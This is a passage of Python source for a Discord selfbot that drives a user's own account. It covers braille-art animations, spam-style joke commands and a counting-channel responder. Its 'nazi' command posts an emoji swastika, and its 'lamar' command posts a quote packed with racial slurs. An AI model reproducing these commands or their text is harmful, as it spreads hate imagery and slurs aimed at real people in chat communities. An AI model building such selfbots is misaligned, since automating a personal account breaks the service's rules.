⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣤⣤⣤⣿⣿⣿
⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿
⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶
⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤
⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿
⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣶
⠀⠀⠀⠀⣿⠉⠿⣿⣿
⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿
⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶
⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶
⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤
⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀
⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿
⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶
⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒
⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉
⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛
⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿
⠀⠀⠀⠀⠀⠀⣿⠛
⠀⠀⠀⠀⠀⠀⣭⣶
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀
⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀
⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣿⣿⣿⣀
⠀⣀⣿⣿⣿⣿⣿⣿
⣶⣿⠛⣭⣿⣿⣿⣿
⠛⠛⠛⣿⣿⣿⣿⠿
⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣀⣭⣿⣿⣿⣿⣀
⠀⠤⣿⣿⣿⣿⣿⣿⠉
⠀⣿⣿⣿⣿⣿⣿⠉
⣿⣿⣿⣿⣿⣿
⣿⣿⣶⣿⣿
⠉⠛⣿⣿⣶⣤
⠀⠀⠉⠿⣿⣿⣤
⠀⠀⣀⣤⣿⣿⣿
⠀⠒⠿⠛⠉⠿⣿
⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⣶⠿⠿⠛
```""")


@glass.command()
async def bubblewrap(ctx):
    await ctx.message.delete()
    await ctx.send(("||pop||" * 10 + "\n") * 10)


@glass.command()
async def nazi(ctx):
    await ctx.message.delete()
    await ctx.send("""
🔴🔴🔴⚪⚪⚪⚫⚫⚫⚪⚪⚪🔴🔴🔴 
🔴🔴⚪⚪⚪⚫⚫⚫⚪⚪⚪⚪⚪🔴🔴 
🔴⚪⚪⚪⚫⚫⚫⚪⚪⚪⚫⚪⚪⚪🔴 
⚪⚪⚪⚫⚫⚫⚪⚪⚪⚫⚫⚫⚪⚪⚪ 
⚪⚪⚪⚪⚫⚫⚫⚪⚫⚫⚫⚫⚫⚪⚪ 
⚪⚫⚪⚪⚪⚫⚫⚫⚫⚫⚪⚫⚫⚫⚪ 
⚫⚫⚫⚪⚪⚪⚫⚫⚫⚪⚪⚪⚫⚫⚫ 
⚪⚫⚫⚫⚪⚫⚫⚫⚫⚫⚪⚪⚪⚫⚪ 
⚪⚪⚫⚫⚫⚫⚫⚪⚫⚫⚫⚪⚪⚪⚪
⚪⚪⚪⚫⚫⚫⚪⚪⚪⚫⚫⚫⚪⚪⚪ 
🔴⚪⚪⚪⚫⚪⚪⚪⚫⚫⚫⚪⚪⚪🔴 
🔴🔴⚪⚪⚪⚪⚪⚫⚫⚫⚪⚪⚪🔴🔴 
🔴🔴🔴⚪⚪⚪⚫⚫⚫⚪⚪⚪🔴🔴🔴
""")


@glass.command()
async def whoasked(ctx):
    await ctx.message.delete()
    await ctx.send(""".　　　　　　　　　　⠀⠀⠀✦ ⠀ ⠀　　　　　　　　　　　　　　⠀⠀⠀⠀⠀* ⠀⠀⠀.　　　　　　　　　　. ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀:comet: ⠀ ⠀⠀⠀⠀⠀⠀.　　　　　　　　　　　　　.　　　ﾟ .　　　　　　　　　　　　　. 　　　　　　　　　　　　　　　✦ 　　　　　,　　　　　　　.

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀:sunny:

　　　　　　*　　　　　　　　　　　.

.　　　　　　　　　　　　　. 　　✦⠀　   　　　,　　　　　　　　　*

　　　　　⠀　　　　⠀　　,

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀.　　　　　 　　⠀　　　⠀.　

 　　˚　　　⠀　⠀  　　,　　　　　　.

　　　　　　　　　　　　　.

　　　　　　*⠀　　⠀  　　　　　⠀✦⠀　

　　　　　　　　　　　　　　　　　　.

　　　　.　　　　.　　　⠀:full_moon:

　　　　　　　　　　　.

　　　　　　　:rocket:

　　　˚　　　　　　　　ﾟ　　　　　.

　.⠀　　:earth_americas:⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,

　　　*　　⠀.

　　　　　.　　　　　　　　　　⠀✦

　˚　　　　　　　　　　　　　　*

.⠀ 　　　　　　　　　　.　　　　　　　　.

　　　　　✦⠀　   　　　,　　    :flying_saucer: ⠀　　

.　　　　　 　　⠀　　　.

　　　˚　　　⠀　⠀ 　　　　　　　　　　　,

　　. ⠀ 　　    　　　　　 　　　　　. Traveled the entire galaxy trying to find who asked""")


@glass.command()
async def lamar(ctx):
    await ctx.message.delete()
    await ctx.send("""Ah, nigga, don't hate me 'cause I'm beautiful, nigga. Maybe if you got rid of that old yee-yee ass haircut you got you'd get some bitches on your dick. Oh, better yet, maybe Tanisha'll call your dog-ass if she ever stop fuckin' with that brain surgeon or lawyer she fucking with. Nigga…""")


countingchannels = {}

@glass.command()
async def countadd(ctx, channel: discord.TextChannel):
    await ctx.message.delete()
    try:
        count = await glass.get_channel(channel.id).history(limit=1).flatten()
        count = int(count[0].content)
    except:
        await ctx.send("failed to find count", delete_after=5)
    global countingchannels
    countingchannels[str(channel.id)] = str(count + 2)
    await channel.send(count + 1)


@glass.listen()
async def on_message(message):
    if str(message.channel.id) in countingchannels:
        if message.author != glass.user:
            if message.content.isdigit():
                count_test = int(countingchannels[str(message.channel.id)])
                if int(message.content) == count_test:
                    count = int(countingchannels[str(message.channel.id)])
                    count += 1
                    await message.channel.send(count)
                    count += 1
                    countingchannels[str(message.channel.id)] = str(count)
                else:
                    await message.channel.send(f"{message.author.mention} messed up")
            else:
                await message.channel.send(f"{message.author.mention} sent text")


@glass.command()
async def restart(ctx):
    await ctx.message.delete()
    os.system("python GlassSelfbot.py")
    exit()


@glass.command()
async def quit(ctx):
    await ctx.message.delete()
    exit()


if __name__ == '__main__':
    init()